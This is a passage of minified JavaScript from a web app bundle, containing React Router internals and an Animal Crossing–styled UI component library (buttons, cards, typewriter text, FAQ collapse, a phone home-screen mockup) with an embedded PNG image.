GE(e,t,r,a){Da()||Je(!1);let{navigator:o}=ne.useContext(sr),{matches:s}=ne.useContext(lr),l=s[s.length-1],h=l?l.params:{};l&&l.pathname;let p=l?l.pathnameBase:"/";l&&l.route;let g=bi(),T;if(t){var E;let P=typeof t=="string"?Or(t):t;p==="/"||(E=P.pathname)!=null&&E.startsWith(p)||Je(!1),T=P}else T=g;let _=T.pathname||"/",S=_;if(p!=="/"){let P=p.replace(/^\//,"").split("/");S="/"+_.replace(/^\//,"").split("/").slice(P.length).join("/")}let I=_E(e,{pathname:S}),F=JE(I&&I.map(P=>Object.assign({},P,{params:Object.assign({},h,P.params),pathname:or([p,o.encodeLocation?o.encodeLocation(P.pathname).pathname:P.pathname]),pathnameBase:P.pathnameBase==="/"?p:or([p,o.encodeLocation?o.encodeLocation(P.pathnameBase).pathname:P.pathnameBase])})),s,r,a);return t&&F?ne.createElement(Ao.Provider,{value:{location:Na({pathname:"/",search:"",hash:"",state:null,key:"default"},T),navigationType:ar.Pop}},F):F}function VE(){let e=nT(),t=zE(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),r=e instanceof Error?e.stack:null,o={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return ne.createElement(ne.Fragment,null,ne.createElement("h2",null,"Unexpected Application Error!"),ne.createElement("h3",{style:{fontStyle:"italic"}},t),r?ne.createElement("pre",{style:o},r):null,null)}const $E=ne.createElement(VE,null);class qE extends ne.Component{constructor(t){super(t),this.state={location:t.location,revalidation:t.revalidation,error:t.error}}static getDerivedStateFromError(t){return{error:t}}static getDerivedStateFromProps(t,r){return r.location!==t.location||r.revalidation!=="idle"&&t.revalidation==="idle"?{error:t.error,location:t.location,revalidation:t.revalidation}:{error:t.error!==void 0?t.error:r.error,location:r.location,revalidation:t.revalidation||r.revalidation}}componentDidCatch(t,r){console.error("React Router caught the following error during render",t,r)}render(){return this.state.error!==void 0?ne.createElement(lr.Provider,{value:this.props.routeContext},ne.createElement(fp.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function KE(e){let{routeContext:t,match:r,children:a}=e,o=ne.useContext(xo);return o&&o.static&&o.staticContext&&(r.route.errorElement||r.route.ErrorBoundary)&&(o.staticContext._deepestRenderedBoundaryId=r.route.id),ne.createElement(lr.Provider,{value:t},a)}function JE(e,t,r,a){var o;if(t===void 0&&(t=[]),r===void 0&&(r=null),a===void 0&&(a=null),e==null){var s;if(!r)return null;if(r.errors)e=r.matches;else if((s=a)!=null&&s.v7_partialHydration&&t.length===0&&!r.initialized&&r.matches.length>0)e=r.matches;else return null}let l=e,h=(o=r)==null?void 0:o.errors;if(h!=null){let T=l.findIndex(E=>E.route.id&&h?.[E.route.id]!==void 0);T>=0||Je(!1),l=l.slice(0,Math.min(l.length,T+1))}let p=!1,g=-1;if(r&&a&&a.v7_partialHydration)for(let T=0;T<l.length;T++){let E=l[T];if((E.route.HydrateFallback||E.route.hydrateFallbackElement)&&(g=T),E.route.id){let{loaderData:_,errors:S}=r,I=E.route.loader&&_[E.route.id]===void 0&&(!S||S[E.route.id]===void 0);if(E.route.lazy||I){p=!0,g>=0?l=l.slice(0,g+1):l=[l[0]];break}}}return l.reduceRight((T,E,_)=>{let S,I=!1,F=null,P=null;r&&(S=h&&E.route.id?h[E.route.id]:void 0,F=E.route.errorElement||$E,p&&(g<0&&_===0?(iT("route-fallback"),I=!0,P=null):g===_&&(I=!0,P=E.route.hydrateFallbackElement||null)));let w=t.concat(l.slice(0,_+1)),Q=()=>{let j;return S?j=F:I?j=P:E.route.Component?j=ne.createElement(E.route.Component,null):E.route.element?j=E.route.element:j=T,ne.createElement(KE,{match:E,routeContext:{outlet:T,matches:w,isDataRoute:r!=null},children:j})};return r&&(E.route.ErrorBoundary||E.route.errorElement||_===0)?ne.createElement(qE,{location:r.location,revalidation:r.revalidation,component:F,error:S,children:Q(),routeContext:{outlet:null,matches:w,isDataRoute:!0}}):Q()},null)}var mp=(function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e})(mp||{}),gp=(function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e})(gp||{});function ZE(e){let t=ne.useContext(xo);return t||Je(!1),t}function eT(e){let t=ne.useContext(dp);return t||Je(!1),t}function tT(e){let t=ne.useContext(lr);return t||Je(!1),t}function Ep(e){let t=tT(),r=t.matches[t.matches.length-1];return r.route.id||Je(!1),r.route.id}function nT(){var e;let t=ne.useContext(fp),r=eT(),a=Ep();return t!==void 0?t:(e=r.errors)==null?void 0:e[a]}function rT(){let{router:e}=ZE(mp.UseNavigateStable),t=Ep(gp.UseNavigateStable),r=ne.useRef(!1);return hp(()=>{r.current=!0}),ne.useCallback(function(o,s){s===void 0&&(s={}),r.current&&(typeof o=="number"?e.navigate(o):e.navigate(o,Na({fromRouteId:t},s)))},[e,t])}const B0={};function iT(e,t,r){B0[e]||(B0[e]=!0)}function aT(e,t){e?.v7_startTransition,e?.v7_relativeSplatPath}function Ta(e){Je(!1)}function uT(e){let{basename:t="/",children:r=null,location:a,navigationType:o=ar.Pop,navigator:s,static:l=!1,future:h}=e;Da()&&Je(!1);let p=t.replace(/^\/*/,"/"),g=ne.useMemo(()=>({basename:p,navigator:s,static:l,future:Na({v7_relativeSplatPath:!1},h)}),[p,h,s,l]);typeof a=="string"&&(a=Or(a));let{pathname:T="/",search:E="",hash:_="",state:S=null,key:I="default"}=a,F=ne.useMemo(()=>{let P=pi(T,p);return P==null?null:{location:{pathname:P,search:E,hash:_,state:S,key:I},navigationType:o}},[p,T,E,_,S,I,o]);return F==null?null:ne.createElement(sr.Provider,{value:g},ne.createElement(Ao.Provider,{children:r,value:F}))}function oT(e){let{children:t,location:r}=e;return XE(Jl(t),r)}new Promise(()=>{});function Jl(e,t){t===void 0&&(t=[]);let r=[];return ne.Children.forEach(e,(a,o)=>{if(!ne.isValidElement(a))return;let s=[...t,o];if(a.type===ne.Fragment){r.push.apply(r,Jl(a.props.children,s));return}a.type!==Ta&&Je(!1),!a.props.index||!a.props.children||Je(!1);let l={id:a.props.id||s.join("-"),caseSensitive:a.props.caseSensitive,element:a.props.element,Component:a.props.Component,index:a.props.index,path:a.props.path,loader:a.props.loader,action:a.props.action,errorElement:a.props.errorElement,ErrorBoundary:a.props.ErrorBoundary,hasErrorBoundary:a.props.ErrorBoundary!=null||a.props.errorElement!=null,shouldRevalidate:a.props.shouldRevalidate,handle:a.props.handle,lazy:a.props.lazy};a.props.children&&(l.children=Jl(a.props.children,s)),r.push(l)}),r}function mo(){return mo=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var r=arguments[t];for(var a in r)Object.prototype.hasOwnProperty.call(r,a)&&(e[a]=r[a])}return e},mo.apply(this,arguments)}function Tp(e,t){if(e==null)return{};var r={},a=Object.keys(e),o,s;for(s=0;s<a.length;s++)o=a[s],!(t.indexOf(o)>=0)&&(r[o]=e[o]);return r}function sT(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function lT(e,t){return e.button===0&&(!t||t==="_self")&&!sT(e)}function Zl(e){return e===void 0&&(e=""),new URLSearchParams(typeof e=="string"||Array.isArray(e)||e instanceof URLSearchParams?e:Object.keys(e).reduce((t,r)=>{let a=e[r];return t.concat(Array.isArray(a)?a.map(o=>[r,o]):[[r,a]])},[]))}function cT(e,t){let r=Zl(e);return t&&t.forEach((a,o)=>{r.has(o)||t.getAll(o).forEach(s=>{r.append(o,s)})}),r}const dT=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],fT=["aria-current","caseSensitive","className","end","style","to","viewTransition","children"],hT="6";try{window.__reactRouterVersion=hT}catch{}const pT=ne.createContext({isTransitioning:!1}),mT="startTransition",H0=cE[mT];function gT(e){let{basename:t,children:r,future:a,window:o}=e,s=ne.useRef();s.current==null&&(s.current=EE({window:o,v5Compat:!0}));let l=s.current,[h,p]=ne.useState({action:l.action,location:l.location}),{v7_startTransition:g}=a||{},T=ne.useCallback(E=>{g&&H0?H0(()=>p(E)):p(E)},[p,g]);return ne.useLayoutEffect(()=>l.listen(T),[l,T]),ne.useEffect(()=>aT(a),[a]),ne.createElement(uT,{basename:t,children:r,location:h.location,navigationType:h.action,navigator:l,future:a})}const ET=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",TT=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,vr=ne.forwardRef(function(t,r){let{onClick:a,relative:o,reloadDocument:s,replace:l,state:h,target:p,to:g,preventScrollReset:T,viewTransition:E}=t,_=Tp(t,dT),{basename:S}=ne.useContext(sr),I,F=!1;if(typeof g=="string"&&TT.test(g)&&(I=g,ET))try{let j=new URL(window.location.href),ie=g.startsWith("//")?new URL(j.protocol+g):new URL(g),de=pi(ie.pathname,S);ie.origin===j.origin&&de!=null?g=de+ie.search+ie.hash:F=!0}catch{}let P=jE(g,{relative:o}),w=_T(g,{replace:l,state:h,target:p,preventScrollReset:T,relative:o,viewTransition:E});function Q(j){a&&a(j),j.defaultPrevented||w(j)}return ne.createElement("a",mo({},_,{href:I||P,onClick:F||s?a:Q,ref:r,target:p}))}),U0=ne.forwardRef(function(t,r){let{"aria-current":a="page",caseSensitive:o=!1,className:s="",end:l=!1,style:h,to:p,viewTransition:g,children:T}=t,E=Tp(t,fT),_=Lo(p,{relative:E.relative}),S=bi(),I=ne.useContext(dp),{navigator:F,basename:P}=ne.useContext(sr),w=I!=null&&yT(_)&&g===!0,Q=F.encodeLocation?F.encodeLocation(_).pathname:_.pathname,j=S.pathname,ie=I&&I.navigation&&I.navigation.location?I.navigation.location.pathname:null;o||(j=j.toLowerCase(),ie=ie?ie.toLowerCase():null,Q=Q.toLowerCase()),ie&&P&&(ie=pi(ie,P)||ie);const de=Q!=="/"&&Q.endsWith("/")?Q.length-1:Q.length;let z=j===Q||!l&&j.startsWith(Q)&&j.charAt(de)==="/",me=ie!=null&&(ie===Q||!l&&ie.startsWith(Q)&&ie.charAt(Q.length)==="/"),Se={isActive:z,isPending:me,isTransitioning:w},xe=z?a:void 0,H;typeof s=="function"?H=s(Se):H=[s,z?"active":null,me?"pending":null,w?"transitioning":null].filter(Boolean).join(" ");let ue=typeof h=="function"?h(Se):h;return ne.createElement(vr,mo({},E,{"aria-current":xe,className:H,ref:r,style:ue,to:p,viewTransition:g}),typeof T=="function"?T(Se):T)});var ec;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(ec||(ec={}));var z0;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(z0||(z0={}));function bT(e){let t=ne.useContext(xo);return t||Je(!1),t}function _T(e,t){let{target:r,replace:a,state:o,preventScrollReset:s,relative:l,viewTransition:h}=t===void 0?{}:t,p=pp(),g=bi(),T=Lo(e,{relative:l});return ne.useCallback(E=>{if(lT(E,r)){E.preventDefault();let _=a!==void 0?a:po(g)===po(T);p(e,{replace:_,state:o,preventScrollReset:s,relative:l,viewTransition:h})}},[g,p,T,a,o,r,e,s,l,h])}function ST(e){let t=ne.useRef(Zl(e)),r=ne.useRef(!1),a=bi(),o=ne.useMemo(()=>cT(a.search,r.current?null:t.current),[a.search]),s=pp(),l=ne.useCallback((h,p)=>{const g=Zl(typeof h=="function"?h(o):h);r.current=!0,s("?"+g,p)},[s,o]);return[o,l]}function yT(e,t){t===void 0&&(t={});let r=ne.useContext(pT);r==null&&Je(!1);let{basename:a}=bT(ec.useViewTransitionState),o=Lo(e,{relative:t.relative});if(!r.isTransitioning)return!1;let s=pi(r.currentLocation.pathname,a)||r.currentLocation.pathname,l=pi(r.nextLocation.pathname,a)||r.nextLocation.pathname;return Kl(o.pathname,l)!=null||Kl(o.pathname,s)!=null}const CT="data:image/png;base64,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",xT="animal-btn-QoKe1",AT="animal-btn-small-6Srsd",LT="animal-btn-middle-zEXqv",kT="animal-btn-large-k9IvA",IT="animal-btn-default-L7yE6",NT="animal-btn-primary-9tMG9",vT="animal-btn-dashed-wzZ-i",RT="animal-btn-text-Tope4",OT="animal-btn-link-pURnf",PT="animal-btn-danger-zQ4kF",wT="animal-btn-ghost-Ykty4",DT="animal-btn-block-MC4pp",MT="animal-btn-loading-PfXLM",FT="animal-animal-btn-loading-Rf1hg",BT="animal-btn-icon-P5CS9",tr={btn:xT,"btn-small":"animal-btn-small-6Srsd",btnSmall:AT,"btn-middle":"animal-btn-middle-zEXqv",btnMiddle:LT,"btn-large":"animal-btn-large-k9IvA",btnLarge:kT,"btn-default":"animal-btn-default-L7yE6",btnDefault:IT,"btn-primary":"animal-btn-primary-9tMG9",btnPrimary:NT,"btn-dashed":"animal-btn-dashed-wzZ-i",btnDashed:vT,"btn-text":"animal-btn-text-Tope4",btnText:RT,"btn-link":"animal-btn-link-pURnf",btnLink:OT,"btn-danger":"animal-btn-danger-zQ4kF",btnDanger:PT,"btn-ghost":"animal-btn-ghost-Ykty4",btnGhost:wT,"btn-block":"animal-btn-block-MC4pp",btnBlock:DT,"btn-loading":"animal-btn-loading-PfXLM",btnLoading:MT,"animal-btn-loading":"animal-animal-btn-loading-Rf1hg",animalBtnLoading:FT,"btn-icon":"animal-btn-icon-P5CS9",btnIcon:BT},va=({type:e="default",size:t="middle",danger:r=!1,ghost:a=!1,block:o=!1,loading:s=!1,disabled:l=!1,icon:h,htmlType:p="button",children:g,className:T,...E})=>{const _=[tr.btn,tr[`btn-${e}`],tr[`btn-${t}`],r&&tr["btn-danger"],a&&tr["btn-ghost"],o&&tr["btn-block"],s&&tr["btn-loading"],T].filter(Boolean).join(" ");return v.jsxs("button",{type:p,className:_,disabled:l,...E,children:[h&&!s&&v.jsx("span",{className:tr["btn-icon"],children:h}),g&&v.jsx("span",{children:g})]})};va.displayName="Button";const bp=({children:e,className:t,style:r,forceAll:a=!0})=>{const o=["animal-cursor",a?"animal-cursor--force":"animal-cursor--scoped",t].filter(Boolean).join(" ");return v.jsx("div",{className:o,style:r,children:e})};bp.displayName="Cursor";const tc=e=>e==null||typeof e=="boolean"?0:typeof e=="string"||typeof e=="number"?String(e).length:Array.isArray(e)?e.reduce((t,r)=>t+tc(r),0):fi.isValidElement(e)?tc(e.props.children):0,nc=(e,t,r="tw")=>{if(t.stopped||e==null||typeof e=="boolean")return null;if(typeof e=="string"||typeof e=="number"){const a=String(e);if(t.remaining>=a.length)return t.remaining-=a.length,a;const o=a.slice(0,t.remaining);return t.remaining=0,t.stopped=!0,o}if(Array.isArray(e))return e.map((a,o)=>v.jsx(fi.Fragment,{children:nc(a,t,`${r}-${o}`)},`${r}-${o}`));if(fi.isValidElement(e)){const a=e.props,o=nc(a.children,t,r);return fi.cloneElement(e,void 0,o)}return null},_p=({children:e,speed:t=90,trigger:r,autoPlay:a=!0,onDone:o})=>{const s=ne.useMemo(()=>tc(e),[e]),[l,h]=ne.useState(a?0:s),p=ne.useRef(null);return ne.useEffect(()=>{if(p.current&&window.clearInterval(p.current),!a){h(s);return}if(h(0),s!==0)return p.current=window.setInterval(()=>{h(g=>g>=s?(p.current&&window.clearInterval(p.current),g):g+1)},t),()=>{p.current&&window.clearInterval(p.current)}},[s,t,r,a]),ne.useEffect(()=>{s>0&&l>=s&&o?.()},[l,s]),v.jsx(v.Fragment,{children:nc(e,{remaining:l,stopped:!1})})};_p.displayName="Typewriter";const HT="animal-card-DJ515",UT="animal-card-title-PL-WB",zT="animal-card-dashed-fqnm1",WT="animal-card-app-pink-3Eo8d",jT="animal-card-purple-Gq7sR",QT="animal-card-app-blue-GHH1a",YT="animal-card-app-yellow-DWB-L",XT="animal-card-app-orange-V5yD7",GT="animal-card-app-teal-R5kFG",VT="animal-card-app-green-xlNUs",$T="animal-card-app-red-DzE0l",qT="animal-card-lime-green-KiJbe",KT="animal-card-yellow-green-4c-lF",JT="animal-card-brown-hLCrx",ZT="animal-card-warm-peach-pink-RlSVo",no={card:HT,"card-title":"animal-card-title-PL-WB",cardTitle:UT,"card-dashed":"animal-card-dashed-fqnm1",cardDashed:zT,"card-app-pink":"animal-card-app-pink-3Eo8d",cardAppPink:WT,"card-purple":"animal-card-purple-Gq7sR",cardPurple:jT,"card-app-blue":"animal-card-app-blue-GHH1a",cardAppBlue:QT,"card-app-yellow":"animal-card-app-yellow-DWB-L",cardAppYellow:YT,"card-app-orange":"animal-card-app-orange-V5yD7",cardAppOrange:XT,"card-app-teal":"animal-card-app-teal-R5kFG",cardAppTeal:GT,"card-app-green":"animal-card-app-green-xlNUs",cardAppGreen:VT,"card-app-red":"animal-card-app-red-DzE0l",cardAppRed:$T,"card-lime-green":"animal-card-lime-green-KiJbe",cardLimeGreen:qT,"card-yellow-green":"animal-card-yellow-green-4c-lF",cardYellowGreen:KT,"card-brown":"animal-card-brown-hLCrx",cardBrown:JT,"card-warm-peach-pink":"animal-card-warm-peach-pink-RlSVo",cardWarmPeachPink:ZT},Jt=({type:e="default",color:t="default",children:r,className:a,style:o,...s})=>{const l=[no.card,e==="title"&&no["card-title"],e==="dashed"&&no["card-dashed"],t!=="default"&&no[`card-${t}`],a].filter(Boolean).join(" ");return v.jsx("div",{className:l,style:o,...s,children:r})};Jt.displayName="Card";const e2="animal-footer-5DMOR",t2="animal-tree-KZ8hX",W0={footer:e2,tree:t2},Sp=({type:e="tree",className:t,style:r})=>{const a=[W0.footer,W0[e],t].filter(Boolean).join(" ");return v.jsx("div",{className:a,style:r})};Sp.displayName="Footer";const n2="animal-faqCard-5jlOE",r2="animal-disabled-9DAjm",i2="animal-questionHeader-iqP87",a2="animal-questionIcon-xRkdp",u2="animal-expanded-a8Eze",o2="animal-questionText-jVpUv",s2="animal-leafDecoration-RoK4H",l2="animal-answerWrapper-tzFtx",c2="animal-answerContent-ppsk-",vn={faqCard:n2,disabled:r2,questionHeader:i2,questionIcon:a2,expanded:u2,questionText:o2,leafDecoration:s2,answerWrapper:l2,answerContent:c2},lo=({question:e,answer:t,defaultExpanded:r=!1,disabled:a=!1,className:o,style:s})=>{const[l,h]=ne.useState(r),p=()=>{a||h(!l)},g=[vn.faqCard,l&&vn.expanded,a&&vn.disabled,o].filter(Boolean).join(" ");return v.jsxs("div",{className:g,style:s,children:[v.jsxs("button",{className:vn.questionHeader,onClick:p,disabled:a,"aria-expanded":l,children:[v.jsx("span",{className:vn.questionIcon,children:l?"−":"+"}),v.jsx("span",{className:vn.questionText,children:e}),v.jsx("span",{className:vn.leafDecoration,children:v.jsx("svg",{viewBox:"0 0 24 24",width:"20",height:"20",children:v.jsx("path",{fill:"currentColor",d:"M17,8C8,10 5.9,16.17 3.82,21.34L5.71,22L6.66,19.7C7.14,19.87 7.64,20 8,20C19,20 22,3 22,3C21,5 14,5.25 9,6.25C4,7.25 2,11.5 2,13.5C2,15.5 3.75,17.25 3.75,17.25C7,8 17,8 17,8Z"})})})]}),v.jsx("div",{className:vn.answerWrapper,children:v.jsx("div",{className:vn.answerContent,children:t})})]})};lo.displayName="Collapse";const d2="animal-phoneContainer-49yKw",f2="animal-phone-bXgSa",h2="animal-statusBar-Vb96q",p2="animal-time-cokU-",m2="animal-signalIcons-TuL3l",g2="animal-screenContent-oyJF-",E2="animal-homeScreen-no2yS",T2="animal-grasswave-l6cyA",b2="animal-dateDisplay-cnvu8",_2="animal-dateDisplayHeader-32i0J",S2="animal-blink--R0wf",y2="animal-dayText-7NEMb",C2="animal-appsGrid-opTs8",x2="animal-appItem-1NmDt",A2="animal-appIcon-tTPIg",L2="animal-iconBounce-n4Boc",k2="animal-appIconOffset-b5SZG",I2="animal-iconBounceOffset-XfsXI",N2="animal-appItemOffset-FEStg",v2="animal-iconCamera-c-grH",R2="animal-iconMiles-L9Cow",O2="animal-iconCritterpedia-okU95",P2="animal-iconDiy-gZgxn",w2="animal-iconDesign-YvE9z",D2="animal-iconMap-xmfHe",M2="animal-iconVariant-k-kkB",F2="animal-iconHelicopter-HV-TH",B2="animal-iconChat-TVZXY",H2="animal-iconWifi-RoLJH",U2="animal-iconLocation-YfhoK",z2="animal-iconPage-wMmBC",W2="animal-badge-drGmk",j2="animal-pageIndicator-mQ-Pg",ot={phoneContainer:d2,phone:f2,statusBar:h2,time:p2,signalIcons:m2,screenContent:g2,homeScreen:E2,grasswave:T2,dateDisplay:b2,dateDisplayHeader:_2,blink:S2,dayText:y2,appsGrid:C2,appItem:x2,appIcon:A2,iconBounce:L2,appIconOffset:k2,iconBounceOffset:I2,appItemOffset:N2,iconCamera:v2,iconMiles:R2,iconCritterpedia:O2,iconDiy:P2,iconDesign:w2,iconMap:D2,iconVariant:M2,iconHelicopter:F2,iconChat:B2,iconWifi:H2,iconLocation:U2,iconPage:z2,badge:W2,pageIndicator:j2},Q2=[{id:"camera",iconClass:"iconCamera",color:"#B77DEE",hasNewMessage:!0},{id:"app",iconClass:"iconMiles",color:"#889DF0",offset:!0},{id:"critterpedia",iconClass:"iconCritterpedia",color:"#F7CD67"},{id:"diy",iconClass:"iconDiy",color: